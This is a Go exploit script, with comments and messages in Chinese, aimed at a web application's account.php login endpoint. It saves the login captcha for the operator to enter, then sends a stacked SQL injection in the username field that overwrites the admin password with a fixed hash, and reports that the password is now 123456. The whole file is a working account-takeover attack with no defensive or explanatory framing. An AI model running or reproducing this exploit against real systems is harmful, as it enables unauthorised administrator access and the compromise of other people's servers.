package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"io"
	"net/http"
	"net/http/cookiejar"
	"os"
	"regexp"
)

func exp(url string, Headers map[string]string) string {
	jar, err := cookiejar.New(nil)
	client := &http.Client{Jar: jar}
	// 获取验证码图片
	resq1, err := http.NewRequest("GET", url, nil)
	if err != nil {
		panic(err)
	}
	for k, v := range Headers {
		resq1.Header.Set(k, v)
	}
	resp1, _ := client.Do(resq1)
	defer resp1.Body.Close()
	resq2, err := http.NewRequest("GET", url+"service/app/account.php?type=vercode", nil)
	if err != nil {
		panic(err)
	}
	resp2, _ := client.Do(resq2)
	file, err := os.Create("D:\\code.png")
	if err != nil {
		panic(err)
	}
	defer file.Close()
	_, err = io.Copy(file, resp2.Body)
	if err != nil {
		panic(err)
	}
	fmt.Println("图片已保存在 D:/code.png 请及时查看")
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Print("请输入验证码：")
	scanner.Scan()
	code := scanner.Text()
	// 打payload
	body := bytes.NewBufferString("type=login&username=admin';UPDATE ADMINS set PASSWORD = 'c26be8aaf53b15054896983b43eb6a65' where username = 'admin';--&password=admin&verifycode=" + code)
	resq3, err := http.NewRequest("POST", url+"service/app/account.php", body)
	if err != nil {
		panic(err)
	}
	for k, v := range Headers {
		resq3.Header.Set(k, v)
	}
	resp, err := client.Do(resq3)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	msg, _ := goquery.NewDocumentFromReader(resp.Body)
	reg, _ := regexp.MatchString(`.\\u7cfb\\u7edf\\u4e3b\\u670d\\u52a1\\u6545\\u969c\\uff0c\\u8bf7\\u5c1d\\u8bd5\\u91cd\\u542f\\u4e3b\\u670d\\u52a1`, msg.Text())
	if reg {
		return "存在漏洞，admin密码修改已经修改为123456"
	} else {
		return "未发现漏洞"
	}
}
func main() {
	Headers := map[string]string{"X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
	var url string
	flag.StringVar(&url, "u", "", "指定url")
	flag.Parse()
	fmt.Println(exp(url, Headers))
}
